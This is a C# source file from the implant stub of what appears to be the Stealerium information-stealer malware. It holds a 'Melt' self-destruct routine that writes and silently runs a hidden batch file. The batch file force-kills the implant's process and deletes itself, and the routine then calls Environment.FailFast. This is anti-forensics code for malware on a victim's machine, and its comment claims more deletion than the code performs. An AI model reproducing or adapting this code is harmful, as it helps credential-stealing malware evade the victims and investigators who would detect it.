using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Modules.Implant
{
    internal sealed class SelfDestruct
    {
        /// <summary>
        /// Deletes the current process and performs self-destruction.
        /// </summary>
        public static void Melt()
        {
            // Generate a temporary batch file to execute the self-destruct procedure
            var batchFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".bat");
            var currentProcessId = Process.GetCurrentProcess().Id;

            try
            {
                // Write the batch file with necessary commands
                using (var sw = new StreamWriter(batchFile))
                {
                    sw.WriteLine("chcp 65001"); // Ensure UTF-8 encoding
                    sw.WriteLine($"taskkill /F /PID {currentProcessId}"); // Force kill the current process by PID
                    sw.WriteLine("timeout /T 2 /NOBREAK > NUL"); // Wait for 2 seconds
                    sw.WriteLine($"del /F /Q \"{batchFile}\""); // Delete the batch file itself after execution
                }

                // Log the self-destruct procedure initiation
                Logging.Log("SelfDestruct: Initiating self-destruct procedure...");

                // Execute the batch file using cmd.exe with hidden window and no command prompt
                var processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/C \"" + batchFile + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };

                Process.Start(processStartInfo);

                // Delay execution to ensure the current process terminates before further actions
                Thread.Sleep(5000);

                // Force immediate process termination without triggering exception handlers
                Environment.FailFast(null);
            }
            catch (Exception ex)
            {
                // Log any failure that occurs during the self-destruct procedure
                Logging.Log($"SelfDestruct: Failed to execute self-destruct procedure. Error: {ex.Message}");
            }
        }
    }
}
